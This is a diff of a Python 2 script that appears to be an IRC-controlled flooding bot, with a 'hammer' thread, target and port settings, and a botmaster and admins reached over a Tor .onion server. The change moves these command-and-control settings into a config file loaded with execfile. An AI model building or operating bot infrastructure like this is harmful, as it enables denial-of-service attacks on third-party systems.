@@ -41,6 +41,11 @@ target = None
 threads = None
 port = None
 
+# Config
+
+config = {}
+execfile("configuration.conf", config) 
+
 # Classes & Threading
 
 class hammer(threading.Thread):
@@ -50,7 +55,7 @@ class hammer(threading.Thread):
 print(bcolors.OKBLUE + art + bcolors.ENDC)
 time.sleep(1)
 
-version = "0.1.1"
+version = "0.1.2"
 
 print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
 print(bcolors.OKBLUE + "v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND" + bcolors.ENDC)
@@ -97,14 +102,14 @@ if nickname ==  "":
 print("If you want a better nickname than " + bcolors.FAIL + nickname + bcolors.ENDC + ", then set it inside the file.")
 username = nickname
 realname = nickname
-ircd = "3ieus5zeidnhs35p.onion"
-ircport = 1337
+ircd = config["ircd"]
+ircport = config["ircport"]
 
-botmaster = "ClaudiaD"
-masterbot = "ClaudiaBOT"
-admins = ['Case', 'ODB']
+botmaster = config["botmaster"]
+masterbot = config["masterbot"]
+admins = config["admins"]
 
-channel = "#claudiamind"
+channel = config["channel"]
 
 password = ""
 
@@ -185,7 +190,7 @@ while 1:
     
 
 
-    #print "recvd: " + recvd - the user doesn't need to see this, it's ugly
+    #print "recvd: " + recvd
     #print "<%r> %r" % (senderuser, sentmessage)
     print bcolors.OKBLUE + "<" + senderuser + "> " + bcolors.ENDC + sentmessage 
     if "PING :" in recvd:
